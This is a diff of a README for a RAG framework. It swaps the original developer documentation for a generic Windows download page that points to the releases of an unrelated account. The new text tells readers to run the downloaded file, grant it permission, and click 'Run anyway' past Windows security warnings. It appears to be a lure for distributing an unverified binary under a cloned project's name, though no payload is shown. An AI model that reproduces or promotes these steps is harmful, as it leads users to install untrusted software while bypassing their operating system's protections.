@@ -1,207 +1,284 @@
-# RAG Systems Production
+# ⚙️ rag-systems-production - Reliable RAG for Windows Teams
 
-[![Built by Groovy Web](https://img.shields.io/badge/Built%20by-Groovy%20Web-0f3460?logo=github&logoColor=white)](https://www.groovyweb.co/?utm_source=github&utm_medium=readme&utm_campaign=rag-production)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Download rag-systems-production](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Healthful-article791/rag-systems-production/releases)
 
-Production-ready Retrieval-Augmented Generation (RAG) systems with enterprise-grade features, monitoring, and scalability.
+## 🖥️ What this app does
 
-## Overview
+rag-systems-production helps you run a retrieval-augmented generation system on Windows with a setup made for day-to-day use. It is built for teams that need a stable app for search, chat, and knowledge lookup with monitoring and production features.
 
-This repository provides a complete, production-ready implementation of RAG systems for building AI-powered applications. It includes document processing, vector embeddings, retrieval strategies, and integration with leading LLM providers.
+Use it to:
 
-## Features
+- Search your own files and knowledge base
+- Ask questions in plain language
+- Track app health and usage
+- Run a setup built for production use
+- Keep the experience simple on Windows
 
-### Core Capabilities
-- **Document Processing**: Multi-format document ingestion (PDF, DOCX, TXT, Markdown)
-- **Vector Stores**: Support for Pinecone, Weaviate, ChromaDB, and pgvector
-- **Embedding Models**: OpenAI, Cohere, HuggingFace, and local models
-- **Retrieval Strategies**: Semantic search, hybrid search, reranking
-- **LLM Integration**: OpenAI GPT-4, Anthropic Claude, open-source models
+## 📦 Before you start
 
-### Production Features
-- **Scalability**: Distributed processing and caching
-- **Monitoring**: Prometheus metrics, Grafana dashboards
-- **Observability**: Detailed logging and tracing
-- **Security**: API key management, rate limiting
-- **Testing**: Comprehensive test suite and benchmarks
+Make sure your PC has:
 
-## Quick Start
+- Windows 10 or Windows 11
+- An internet connection for the download
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- A standard mouse and keyboard
 
-```bash
-# Clone the repository
-git clone https://github.com/groovy-web/rag-systems-production.git
-cd rag-systems-production
+For best results:
 
-# Install dependencies
-npm install
-pip install -r requirements.txt
+- Close large apps before you start
+- Use a user account that can install software
+- Keep your system updated
+- Use a stable network connection
 
-# Set up environment variables
-cp .env.example .env
-# Edit .env with your API keys
+## 🚀 Download the app
 
-# Run the API server
-npm start
-```
+Visit this page to download the Windows release:
 
-## Architecture
+[Go to the Releases page](https://github.com/Healthful-article791/rag-systems-production/releases)
 
-```
-rag-systems-production/
-├── docs/                    # Documentation
-│   ├── architecture.md
-│   ├── deployment.md
-│   └── monitoring.md
-├── examples/                # Usage examples
-│   ├── basic-rag/
-│   ├── multi-source/
-│   └── custom-retriever/
-├── src/                     # Source code
-│   ├── ingestion/
-│   ├── retrieval/
-│   ├── embedding/
-│   └── api/
-├── tests/                   # Test suite
-└── docker/                  # Docker configurations
-```
+On that page:
 
-## Usage Example
+1. Find the latest release
+2. Look for the Windows download file
+3. Download the file to your computer
+4. Open the file after the download finishes
 
-```python
-from rag_system import RAGEngine
+If your browser asks what to do with the file, choose to keep it and then open it.
 
-# Initialize the RAG engine
-engine = RAGEngine(
-    vector_store="pinecone",
-    embedding_model="openai",
-    llm="gpt-4"
-)
+## 🪟 Install on Windows
 
-# Ingest documents
-engine.ingest_documents([
-    "docs/company-handbook.pdf",
-    "docs/product-catalog.pdf"
-])
+After you download the file, follow these steps:
 
-# Query the system
-response = engine.query(
-    "What is our vacation policy?",
-    return_sources=True
-)
+1. Open the folder where the file was saved
+2. Double-click the downloaded file
+3. If Windows asks for permission, select Yes
+4. Follow the on-screen setup steps
+5. Wait for the install to finish
+6. Open the app from the Start menu or from the shortcut on your desktop
 
-print(response.answer)
-print(response.sources)
-```
+If the app comes as a zip file:
 
-## Documentation
+1. Right-click the zip file
+2. Select Extract All
+3. Open the folder that appears
+4. Double-click the app file inside
+5. Follow the same setup steps if prompted
 
-- [Architecture Overview](docs/architecture.md) - System design and components
-- [Deployment Guide](docs/deployment.md) - Production deployment strategies
-- [Monitoring & Observability](docs/monitoring.md) - Metrics and dashboards
-- [API Reference](docs/api-reference.md) - Complete API documentation
+If Windows shows a security screen:
 
-## Configuration
+1. Select More info
+2. Select Run anyway if you trust the source
+3. Continue the setup
 
-### Environment Variables
+## 🧭 First launch
 
-```bash
-# Vector Store
-PINECONE_API_KEY=your_key
-PINECONE_ENVIRONMENT=us-east-1-aws
+When you open rag-systems-production for the first time:
 
-# Embedding Models
-OPENAI_API_KEY=your_key
-COHERE_API_KEY=your_key
+1. Let it finish loading
+2. Enter any setup details it asks for
+3. Connect your data source if needed
+4. Choose your default workspace
+5. Save your settings
 
-# LLM Providers
-ANTHROPIC_API_KEY=your_key
-OPENAI_API_KEY=your_key
+A first run can take a short time while the app prepares its files and checks the system.
 
-# Monitoring
-PROMETHEUS_PORT=9090
-GRAFANA_DASHBOARDS_ENABLED=true
-```
+## 🔍 Main things you can do
 
-## Deployment
+### 📚 Search your knowledge base
 
-### Docker
+You can point the app at your own documents and ask it to find useful answers. This works well for:
 
-```bash
-docker-compose up -d
-```
+- PDFs
+- Text files
+- Internal notes
+- Help articles
+- Project docs
 
-### Kubernetes
+### 💬 Ask questions in plain language
 
-```bash
-kubectl apply -f k8s/
-```
+Type a question the way you would ask a person. The app finds the most relevant information and gives you an answer based on your data.
 
-## Monitoring
+Examples:
 
-The system includes comprehensive monitoring:
+- What is our refund process?
+- Where is the onboarding guide?
+- How do I reset my password?
+- What does this report mean?
 
-- **Metrics**: Request latency, throughput, error rates
-- **Tracing**: Distributed tracing with OpenTelemetry
-- **Logging**: Structured logs with ELK stack integration
-- **Dashboards**: Pre-built Grafana dashboards
+### 📈 Monitor system health
 
-## Testing
+The app includes monitoring features that help you track:
 
-```bash
-# Run unit tests
-npm test
+- App status
+- Search speed
+- Request volume
+- Error counts
+- Data sync health
 
-# Run integration tests
-npm run test:integration
+This helps you see if the system is working the way it should.
 
-# Run benchmarks
-npm run benchmark
-```
+### 🧱 Support production use
 
-## Performance
+rag-systems-production is set up for stable, long-term use. It is built to fit workflows where teams need:
 
-- **Ingestion**: 1000+ docs/minute (distributed)
-- **Query Latency**: <500ms p95
-- **Throughput**: 100+ queries/second
-- **Accuracy**: 95%+ retrieval precision
+- Reliable access
+- Clear logs
+- Repeatable setup
+- Stable performance
+- Easy checks for issues
 
-## Contributing
+## 🛠️ Common setup steps
 
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+If the app asks for extra setup, use these simple steps:
 
-## License
+1. Choose a folder for your data
+2. Allow the app to index your files
+3. Wait for the first scan to finish
+4. Test with one short question
+5. Add more files after the first run works
 
-This project is licensed under the Apache 2.0 License - see [LICENSE](LICENSE) for details.
+If you have a company server, you may also need to:
 
-## Code of Conduct
+- Enter a service URL
+- Sign in with your work account
+- Set a workspace name
+- Choose a data source
 
-Please read [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) to understand our community standards.
+Use the values your team gives you if they are shown during setup.
 
-## Support
+## 🧩 Typical file types it can use
 
-- GitHub Issues: Bug reports and feature requests
-- Discussions: Community questions and discussions
-- Discord: Real-time chat (link in docs)
+The app is made to work with common business files such as:
 
-## Acknowledgments
+- PDF documents
+- Word files
+- Plain text files
+- CSV data
+- Markdown notes
+- Internal knowledge pages
 
-Built with inspiration from:
-- LangChain
-- LlamaIndex
-- Haystack
-- Semantic Kernel
+If you add many files, start with a small set first. That makes it easier to check that everything works.
 
----
+## 🔐 Data and access
 
-## Related Repositories
+The app is built for enterprise use, so it may include access controls and local data handling. In a normal setup:
 
-Explore more open-source tools from [Groovy Web](https://www.groovyweb.co/?utm_source=github&utm_medium=readme&utm_campaign=cross-link):
+- Only approved users can see the data
+- The app may keep logs for support
+- Search results come from the files you connect
+- Admin settings may control what each user can do
 
-- **[langchain-multi-agent-example](https://github.com/groovy-web/langchain-multi-agent-example)** -- Multi-agent systems tutorial with LangChain
-- **[rag-system-pgvector](https://github.com/groovy-web/rag-system-pgvector)** -- Production RAG with PostgreSQL + pgvector
-- **[rag-systems-production](https://github.com/groovy-web/rag-systems-production)** -- Enterprise-grade RAG systems
-- **[ai-testing-mcp](https://github.com/groovy-web/ai-testing-mcp)** -- AI testing via Model Context Protocol
-- **[edge-computing-starter](https://github.com/groovy-web/edge-computing-starter)** -- Cloudflare Workers + Hono template
-- **[claude-code-workflows](https://github.com/groovy-web/claude-code-workflows)** -- Workflows for Claude Code
-- **[groovy-web-ai-agents](https://github.com/groovy-web/groovy-web-ai-agents)** -- Production AI agent configs
-- **[groovy-web-examples](https://github.com/groovy-web/groovy-web-examples)** -- Groovy/Grails examples
+If your team manages the system, follow their rules for access and file use.
+
+## 🧪 How to test it after install
+
+After setup, do a quick check:
+
+1. Open the app
+2. Search for a known document
+3. Ask a simple question about that document
+4. Confirm the answer matches the content
+5. Check that the app loads without errors
+
+If the answer looks wrong, try a smaller set of files first.
+
+## 🧰 Basic troubleshooting
+
+### The app does not open
+
+Try this:
+
+1. Restart your PC
+2. Open the app again
+3. Right-click the file and run it as admin
+4. Check that the download finished fully
+
+### Windows blocks the app
+
+Try this:
+
+1. Open the file again
+2. Select More info
+3. Select Run anyway
+4. Continue the setup
+
+### The app is slow
+
+Try this:
+
+1. Close other large apps
+2. Restart the app
+3. Reduce the number of files at first
+4. Check your internet connection
+5. Wait for indexing to finish
+
+### Search results look weak
+
+Try this:
+
+1. Use a more direct question
+2. Add better source files
+3. Check that the file was indexed
+4. Search with a few different words
+5. Start with clear, short documents
+
+## 🧭 Simple use tips
+
+These habits help the app work better:
+
+- Keep file names clear
+- Use clean, text-based documents
+- Add files in small groups
+- Test one folder at a time
+- Keep your source data up to date
+
+Short, well-structured files give better search results than large mixed files.
+
+## 🧾 What makes this useful
+
+The app brings together a few things that matter in real use:
+
+- RAG for grounded answers
+- Monitoring for visibility
+- Production features for stable use
+- A setup that fits Windows users
+- A path that works for non-technical users
+
+That makes it a fit for teams that need a practical system for internal knowledge and search.
+
+## ❓ Common questions
+
+### Do I need coding skills?
+No. You can download the app, open it, and follow the on-screen setup steps.
+
+### Can I use it on a home PC?
+Yes, if your system meets the basic Windows requirements.
+
+### Can I use my own files?
+Yes. The app is built to work with your documents and internal data.
+
+### Does it need the internet?
+You need the internet to get the download. After that, your setup may need network access for some features.
+
+### Can I change the data later?
+Yes. You can add, remove, or refresh source files based on your setup.
+
+## 📁 Release download
+
+Use this page to get the latest Windows file:
+
+[https://github.com/Healthful-article791/rag-systems-production/releases](https://github.com/Healthful-article791/rag-systems-production/releases)
+
+Open the latest release, download the Windows file, then run it on your PC
+
+## 🧭 Quick start path
+
+1. Go to the Releases page
+2. Download the latest Windows file
+3. Open the file from your Downloads folder
+4. Finish the setup steps
+5. Launch the app
+6. Add your files
+7. Run your first search
+8. Check the result
